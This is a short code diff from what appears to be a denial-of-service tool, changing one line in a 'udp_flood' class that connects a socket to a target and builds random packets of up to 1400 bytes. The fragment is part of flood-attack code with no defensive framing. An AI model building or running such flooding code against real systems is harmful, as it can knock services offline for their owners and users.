@@ -53,7 +53,7 @@ class udp_flood(DDoS_Class):
                         s.connect((self.target, self.port))
                     msg = ""
                     for x in range(random.randint(self.min_size, self.max_size)):
-                        msg += random.choice(lis)
+                        msg += random.choice(Common_Variables.source_string)
                     if len(msg) > 1400:
                         msg = msg[
                             0:1400
